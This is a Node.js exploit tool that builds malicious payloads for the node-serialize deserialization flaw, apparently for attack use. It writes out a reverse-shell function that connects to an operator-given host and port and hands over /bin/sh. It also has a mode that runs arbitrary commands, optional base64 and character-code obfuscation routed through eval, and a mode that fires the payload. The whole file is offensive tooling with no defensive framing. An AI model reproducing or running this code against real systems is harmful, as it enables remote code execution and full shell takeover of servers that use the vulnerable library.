var serializer = require('node-serialize');
var fs = require('fs');

var argv = require('yargs')
	.usage('Usage: $0 -f [file] [options]')
	.alias('f','file')
	.alias('m','mode')
	.alias('v','vector')
	.alias('c','command')
	.alias('e','encode')
	.alias('H','lhost')
	.alias('P','lport')
	.choices('m',['serialize','deserialize'])
	.choices('v',['rce','rshell'])
	.choices('e',['base64','charcode'])
	.default('m', 'serialize')
    .demandOption(['f'])
    .argv;

var payload;

trash_tag = "\n|\t";
cmd_tag = "####COMMAND####";
lhost_tag = "####LHOST####";
lport_tag = "####LPORT####";

if(argv.vector == "rshell"){
	if(typeof argv.lport == 'undefined' || typeof argv.lhost == 'undefined'){
		console.log("[-] Rshell vector requires LHOST and LPORT to be specified");
		process.exit();
	}
	payload = {
		rce : function() {
			var net = require('net');
			var spawn = require('child_process').spawn;
			HOST = "####LHOST####";
			PORT = "####LPORT####";
			TIMEOUT="5000";
			if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }
			function c(HOST,PORT) {
				var client = new net.Socket();
				client.connect(PORT, HOST, function() {
					var sh = spawn('/bin/sh',[]);
					client.write("Connected!");
					client.pipe(sh.stdin);
					sh.stdout.pipe(client);
					sh.stderr.pipe(client);
					sh.on('exit',function(code,signal){
					  client.end("Disconnected!");
					});
				});
				client.on('error', function(e) {
					setTimeout(c(HOST,PORT), TIMEOUT);
				});
			}
			c(HOST,PORT);
		}
	}
} else if (argv.vector == "rce"){
	if(typeof argv.command == 'undefined'){
		console.log("[-] RCE vector requires a command to be specified");
		process.exit();
	}
	payload = {
		rce : function(){
			CMD = "####COMMAND####";
			require('child_process').exec(CMD, function(error, stdout, stderr) { console.log(stdout) });
		},
	}
} else {
	payload = {
		rce : function(){
			require('child_process').exec('cmd /c calc', function(error, stdout, stderr) { console.log(stdout) });
		},
	}
}

reverse_encoding = new Array();
p = payload.toString();

if ( typeof argv.encode != 'undefined'){
	if (argv.encode instanceof Array){
		argv.encode = argv.encode;
	}else{
		argv.encode = [argv.encode];
	}
}else{
	argv.encode = [];
} 

if(argv.encode.length > 0){
	argv.encode.forEach(function(enc){
		if (enc == "base64"){
			p = btoa(p.toSt);
			reverse_encoding.push("atob");
		}else if(enc == "charcode"){
			var x = new Array();
			for(var i=0; i < p.length; i++){
				x.push(p.charCodeAt(i));
			}
			p = "[" + x.toString() + "]";
			reverse_encoding.push("eval");			
			reverse_encoding.push("String.fromCharCode");			
		}
	});
}

reverse_func = "";

if(reverse_encoding.length > 0){
	reverse_encoding.reverse().forEach(function (func){
		reverse_func += func + "(";
	});
	reverse_func += p;
	reverse_func += ")".repeat(reverse_encoding.length);
	
	console.log(reverse_func);
	
	payload["rce"] = function(){
		eval(reverse_func);
	}
}


if(argv.mode == "serialize"){
	var serialized_object = serializer.serialize(payload);
	serialized_object = serialized_object.replace(/(\\t|\\n)/gmi,"");
	serialized_object = serialized_object.replace(cmd_tag, argv.command);
	serialized_object = serialized_object.replace(lhost_tag, argv.lhost);
	serialized_object = serialized_object.replace(lport_tag, argv.lport);
	serialized_object = serialized_object.replace(/("}\s*)$/, '()"}');
	console.log(serialized_object);
	
	fs.writeFile(argv.file, serialized_object, function (err) {
		if (err) throw err;
		console.log('[+] Serializing payload');
}); 
}else if(argv.mode == "deserialize"){
	fs.readFile(argv.file, function(err, data) {
		if (err) throw err;
		console.log('[+] Deserializing payload');
		var object = JSON.parse(data);
		serializer.unserialize(object);
	});
}